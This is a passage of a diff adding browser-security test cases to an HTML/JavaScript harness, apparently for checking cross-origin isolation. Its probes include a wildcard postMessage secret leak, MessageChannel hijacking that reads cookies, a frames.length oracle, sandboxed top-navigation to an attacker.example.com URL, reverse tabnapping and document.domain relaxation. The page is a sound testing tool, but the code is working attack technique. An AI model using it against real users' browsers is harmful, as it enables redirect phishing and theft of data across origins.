+    // Set up a "secret" iframe and leak its postMessage via wildcard targetOrigin
+    const secretContent = `<html><body><script>
+      const secret = 'CONFIDENTIAL_TOKEN_' + Math.random().toString(36).slice(2).toUpperCase();
+      // Intentional wildcard — sends secret to ALL origins
+      window.parent.postMessage({secret: secret, user: 'admin@example.com'}, '*');
+    <\/script></body></html>`;
+    const blob = URL.createObjectURL(new Blob([secretContent],{type:'text/html'}));
+    const iframe = document.createElement('iframe');
+    iframe.src = blob;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    window.addEventListener('message', function h(e) {
+      if (e.data && e.data.secret) {
+        log('v9d-log', `[V9d wildcard] ⚡ Received secret via targetOrigin=*: ${JSON.stringify(e.data)}`, 'ok');
+        log('v9d-log', `[V9d] Origin leak: any page that embeds this iframe can read the secret`, 'warn');
+        window.removeEventListener('message', h);
+        setTimeout(() => document.body.removeChild(iframe), 0);
+      }
+    });
+    log('v9d-log', '[V9d wildcard] iframe using postMessage(data,"*") — any origin can receive secret', 'warn');
+    hint('[V9d] wildcard postMessage: parent receives secret token from iframe using targetOrigin="*"');
+
+  } else if (mode === 'channel-hijack') {
+    // MessageChannel port transfer — if port passed to untrusted iframe, attacker reads
+    const channel = new MessageChannel();
+    const victimBlob = URL.createObjectURL(new Blob([`<html><body><script>
+      window.addEventListener('message', e => {
+        if (e.ports && e.ports[0]) {
+          const port = e.ports[0];
+          port.onmessage = msg => {
+            document.body.innerHTML = '<div style="padding:8px;font-size:12px;font-family:monospace;color:green">Port received msg: '+JSON.stringify(msg.data)+'</div>';
+            port.postMessage({response: 'SECRET_RESPONSE_VIA_PORT', cookie: document.cookie});
+          };
+          port.start();
+        }
+      });
+    <\/script></body></html>`], {type:'text/html'}));
+
+    const iframe = document.createElement('iframe');
+    iframe.src = victimBlob;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    channel.port1.onmessage = e => {
+      log('v9d-log', `[V9d channel] ⚡ Response on port1: ${JSON.stringify(e.data)}`, 'ok');
+      log('v9d-log', '[V9d] MessageChannel: if port transferred to wrong iframe, bidirectional channel exposed', 'info');
+      document.body.removeChild(iframe);
+    };
+
+    iframe.onload = () => {
+      iframe.contentWindow.postMessage('init', '*', [channel.port2]);
+      setTimeout(() => channel.port1.postMessage({query: 'get_secret'}), 300);
+      log('v9d-log', '[V9d channel] MessageChannel port transferred to iframe — sending query via port', 'warn');
+    };
+    hint('[V9d] MessageChannel hijack: port transferred to iframe, bidirectional secret channel');
+
+  } else if (mode === 'frame-count') {
+    // window.frames.length as oracle for cross-origin state
+    const target = window.open('https://www.google.com', '_blank', 'width=600,height=500,toolbar=yes,location=yes');
+    if (!target) { log('v9d-log', '✗ Popup blocked', 'err'); return; }
+    popupRefs.push(target);
+
+    let prev = -1;
+    const interval = setInterval(() => {
+      try {
+        const count = target.frames.length;
+        if (count !== prev) {
+          log('v9d-log', `[V9d oracle] window.frames.length changed: ${prev} → ${count} (cross-origin state leak!)`, 'ok');
+          prev = count;
+        }
+      } catch(e) {
+        clearInterval(interval);
+        log('v9d-log', '[V9d oracle] frames.length blocked by cross-origin policy (expected)', 'err');
+      }
+    }, 200);
+    setTimeout(() => clearInterval(interval), 8000);
+    log('v9d-log', '[V9d oracle] Polling google.com popup frames.length — any change = cross-origin state oracle', 'warn');
+    hint('[V9d] frames.length oracle: readable cross-origin? Reveals number of sub-frames in victim page');
+  }
+}
+
+// ── V9e: Top-Level Navigation ────────────────────────────
+function testV9e(mode) {
+  if (mode === 'top-nav') {
+    // Sandboxed iframe tries to navigate top
+    const evilHtml = `<html><body><script>
+      const attempts = [
+        () => { top.location = 'https://attacker.example.com/hijacked'; },
+        () => { top.location.href = 'javascript:alert("top nav XSS")'; },
+        () => { top.location.replace('about:blank'); },
+      ];
+      document.body.style.cssText='padding:8px;font-family:monospace;font-size:12px;background:#010409;color:#c9d1d9';
+      let results = '<b style=color:#58a6ff>Top-nav attempts (sandbox=allow-scripts allow-top-navigation):</b><br>';
+      attempts.forEach((fn, i) => {
+        try { fn(); results += '[' + i + '] <b style=color:#ff7b72>SUCCEEDED — top navigated!</b><br>'; }
+        catch(e) { results += '[' + i + '] <b style=color:#56d364>BLOCKED: ' + e.message.substring(0,60) + '</b><br>'; }
+      });
+      document.body.innerHTML = results;
+    <\/script></body></html>`;
+    const blob = URL.createObjectURL(new Blob([evilHtml],{type:'text/html'}));
+    const iframe = document.createElement('iframe');
+    iframe.src = blob;
+    iframe.sandbox = 'allow-scripts allow-top-navigation';
+    iframe.style.cssText = 'width:100%;height:90px;border:1px solid var(--border);border-radius:6px';
+    document.getElementById('v9e-container').innerHTML = '';
+    document.getElementById('v9e-container').appendChild(iframe);
+    log('v9e-log', '[V9e top-nav] sandbox=allow-top-navigation: iframe attempting top.location =', 'warn');
+    hint('[V9e] iframe with allow-top-navigation tries to redirect top window — check if blocked');
+
+  } else if (mode === 'user-activation') {
+    // allow-top-navigation-by-user-activation: nav only after user gesture
+    const html = `<html><body style="font-family:sans-serif;padding:12px;background:#fff">
+      <p style="font-size:13px">sandbox=<b>allow-top-navigation-by-user-activation</b></p>
+      <button onclick="top.location='about:blank#hijacked_after_user_click'"
+        style="padding:8px 16px;cursor:pointer;background:#e53935;color:#fff;border:none;border-radius:4px">
+        Click me (user activation)
+      </button>
+      <p id="r" style="font-size:12px;color:#666;margin-top:8px">
+        Clicking ↑ should be able to navigate top (user-activation provided).
+      </p>
+    </body></html>`;
+    const blob = URL.createObjectURL(new Blob([html],{type:'text/html'}));
+    const iframe = document.createElement('iframe');
+    iframe.src = blob;
+    iframe.sandbox = 'allow-scripts allow-top-navigation-by-user-activation';
+    iframe.style.cssText = 'width:100%;height:110px;border:1px solid var(--orange);border-radius:6px';
+    document.getElementById('v9e-container').innerHTML = '';
+    document.getElementById('v9e-container').appendChild(iframe);
+    log('v9e-log', '[V9e user-act] allow-top-navigation-by-user-activation: click button inside iframe', 'warn');
+    hint('[V9e] Click button inside iframe → top.location changes? URL bar should show #hijacked_after_user_click');
+
+  } else if (mode === 'opener-null') {
+    // window.open with rel=noopener — verify opener is null
+    const child = window.open('about:blank', '_blank', 'noopener,width=600,height=400');
+    if (!child) { log('v9e-log', '✗ Popup blocked', 'err'); return; }
+    child.document.write(`<html><body style="font-family:monospace;padding:16px;font-size:12px">
+      <b>opener null check (noopener):</b><br>
+      window.opener = <b style="color:${child.opener ? '#ff7b72' : '#56d364'}">${child.opener}</b><br>
+      <small>If opener is NOT null with noopener flag → bug</small>
+    </body></html>`);
+    log('v9e-log', `[V9e opener] Popup with noopener: opener = ${child.opener}`, child.opener ? 'ok' : 'err');
+    log('v9e-log', child.opener ? '⚡ opener is NOT null despite noopener flag!' : 'opener correctly null (expected)', child.opener ? 'ok' : 'info');
+
+  } else if (mode === 'tab-napping') {
+    // Reverse tabnapping: user opens link (target=_blank without noopener) → child sets opener.location
+    const child = window.open('about:blank', '_blank', 'width=600,height=400,toolbar=yes,location=yes');
+    if (!child) { log('v9e-log', '✗ Popup blocked', 'err'); return; }
+    popupRefs.push(child);
+    child.document.write(`<html><body style="font-family:sans-serif;padding:24px">
+      <h3>Legitimate-looking page</h3>
+      <p>User navigated here via a link...</p>
+      <script>
+        // Reverse tabnapping: redirect the original tab (opener) while user reads this page
+        setTimeout(() => {
+          if (window.opener && !window.opener.closed) {
+            try {
+              window.opener.location = 'about:blank#OPENER_HIJACKED';
+              document.body.innerHTML += '<p style=color:red>⚡ Opener redirected to #OPENER_HIJACKED!</p>';
+            } catch(e) {
+              document.body.innerHTML += '<p style=color:green>Opener redirect blocked: ' + e.message + '</p>';
+            }
+          }
+        }, 1500);
+      <\/script>
+    </body></html>`);
+    log('v9e-log', '[V9e tabnap] Popup opened without noopener — will try to redirect opener in 1.5s', 'warn');
+    hint('[V9e tabnap] Watch THIS page URL bar — popup will try to redirect you to #OPENER_HIJACKED');
+  }
+}
+
+// ── V9f: document.domain ─────────────────────────────────
+function testV9f(mode) {
+  const container = document.getElementById('v9f-container');
+  container.innerHTML = '';
+
+  if (mode === 'same-site') {
+    localStorage.setItem('v9f-parent-secret', 'PARENT_LOCALSTORAGE_'+Date.now());
+    const childHtml = `<html><body style="font-family:monospace;font-size:12px;padding:10px;background:#010409;color:#c9d1d9">
+      <script>
+        document.domain = '${location.hostname}';
+        let result;
+        try {
+          // Try to read parent's localStorage after relaxing document.domain
+          result = window.parent.localStorage.getItem('v9f-parent-secret') || '(null)';
+          document.body.innerHTML = 'document.domain relaxed to <b style=color:#ffa657>${location.hostname}</b><br>'
+            + 'parent localStorage = <b style=color:' + (result && result.includes('PARENT') ? '#ff7b72' : '#56d364') + '>' + result + '</b>';
+        } catch(e) {
+          document.body.innerHTML = 'document.domain = <b style=color:#ffa657>${location.hostname}</b> — parent access: <b style=color:#56d364>BLOCKED: '+e.message+'</b><br>'
+            + '<small style=color:#8b949e>Chrome 106+: Origin-Agent-Cluster blocks document.domain relaxation by default</small>';
+        }
+      <\/script>
+    </body></html>`;
+    const blob = URL.createObjectURL(new Blob([childHtml],{type:'text/html'}));
+    const iframe = document.createElement('iframe');
+    iframe.src = blob;
+    iframe.style.cssText = 'width:100%;height:80px;border:1px solid var(--border);border-radius:6px';
+    try { document.domain = location.hostname; } catch(e) {}
+    container.appendChild(iframe);
+    log('v9f-log', '[V9f same-site] Both parent + iframe set document.domain. Can iframe read parent localStorage?', 'warn');
+    hint('[V9f] document.domain relaxation: can iframe access parent localStorage after both relax?');
+
+  } else if (mode === 'null-bypass') {
+    // data: URL → document.domain null origin → try to escape
+    const b64 = btoa(`<html><body><script>
+      document.body.style.cssText='font-family:monospace;font-size:12px;padding:10px;background:#010409;color:#c9d1d9';
+      let tries = '';
+      try { document.domain = ''; tries += 'document.domain="" → OK\\n'; } catch(e) { tries += 'document.domain="" → BLOCKED: '+e.message+'\\n'; }
+      try { document.domain = '${location.hostname}'; tries += 'document.domain=hostname → OK\\n'; } catch(e) { tries += 'document.domain=hostname → BLOCKED: '+e.message+'\\n'; }
+      try { tries += 'parent.location = '+parent.location.href; } catch(e) { tries += 'parent.location → BLOCKED\\n'; }
+      document.body.innerText = tries;
+    <\/script></body></html>`);
+    const iframe = document.createElement('iframe');
+    iframe.src = `data:text/html;base64,${b64}`;
+    iframe.style.cssText = 'width:100%;height:90px;border:1px solid var(--border);border-radius:6px';
+    container.appendChild(iframe);
+    log('v9f-log', '[V9f null-bypass] data: URL iframe (null origin) tries to relax document.domain', 'warn');
+
+  } else if (mode === 'oac-check') {
+    // Check if Origin-Agent-Cluster is active
+    const info = {
+      'Origin-Agent-Cluster active': typeof window.originAgentCluster !== 'undefined' ? window.originAgentCluster : 'check response header',
+      'document.domain settable': (() => { try { document.domain = document.domain; return 'YES (not OAC-blocked)'; } catch(e) { return 'NO: ' + e.message; } })(),
+      'current origin': window.location.origin,
+      'OAC indicator': 'Check Network tab: Origin-Agent-Cluster: ?1 response header',
+    };
+    const pre = document.createElement('pre');
+    pre.style.cssText = 'font-size:12px;padding:12px;background:#010409;color:#c9d1d9;border-radius:6px';
+    pre.innerHTML = Object.entries(info).map(([k,v]) =>
+      `<span style="color:#58a6ff">${k}</span>: <span style="color:#ffa657">${v}</span>`
+    ).join('\n');
+    container.appendChild(pre);
+    log('v9f-log', `[V9f OAC] document.domain settable: ${info['document.domain settable']}`, info['document.domain settable'].startsWith('YES') ? 'ok' : 'info');
+    log('v9f-log', '[V9f OAC] If settable → document.domain relaxation possible → test same-site subdomain cross-read', 'warn');
+    hint('[V9f] OAC check: if document.domain settable, test subdomain cross-read with V9f same-site');
+  }
+}
+
+// ─────────────────────────────────────────────────────────
+// Sidebar active link highlight on scroll
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('.nav-item');
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (window.scrollY >= s.offsetTop - 80) current = s.id;
+  });
+  navLinks.forEach(l => {
+    l.style.color = l.getAttribute('href') === '#' + current ? 'var(--blue)' : '';
+  });
+}, {passive: true});
+</script>
+</body>
+</html>
